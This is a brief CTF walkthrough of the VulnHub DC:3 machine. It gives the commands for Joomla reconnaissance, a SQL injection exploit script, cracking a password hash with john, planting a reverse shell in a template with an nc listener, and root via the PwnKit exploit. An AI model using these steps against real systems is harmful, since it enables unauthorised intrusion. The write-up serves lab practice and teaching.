
# DC:3 Walkthrough 

**VulnHub Link:** [DC:3](https://www.vulnhub.com/entry/dc-32,312/)
**Difficulty:** Easy
**Release Date:** 25 Apr 2020

## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.131
joomscan  --url "http://192.168.100.134/"

## 2.Exploitation

joomla 3.7.0 exploit ---> install https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/DC:3/joomblah.py

python joomblah.py http://192.168.100.134

hash found --> hash > hash.txt

## 3. Hash decoding
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

password found : scoopy

logged in and we changed content of index.php in templates section to reverse_shell.php

and before executing --> rlwrap nc -nvlp 1234

shell opened 

pkexec version is 0.105 --> Pwnkit Exploit

## 4. Previlige Escalation

from https://www.exploit-db.com/exploits/50689 --> we did all what is written there

and BINGO!!! Root session opened 

Root flag Captured..!
